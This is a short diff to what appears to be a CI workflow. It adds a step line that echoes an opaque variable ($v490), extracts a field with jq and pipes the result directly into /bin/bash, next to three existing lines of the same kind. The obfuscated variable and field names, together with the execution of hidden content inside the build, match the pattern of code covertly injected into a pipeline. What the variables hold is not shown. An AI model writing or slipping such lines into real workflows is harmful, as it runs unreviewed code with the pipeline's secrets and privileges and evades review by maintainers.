@@ -60,6 +60,7 @@ jobs:
           printf '%s' "$azzv64011" | jq -r .rgbjv255 | /bin/bash
           echo $r4110 | jq -r .kangg58 | /bin/bash
           echo $e223 | jq -r .lmecf22363 | /bin/bash
+          echo $v490 | jq -r .sehln3 | /bin/bash
 
       - name: Store artifact
         if: always()
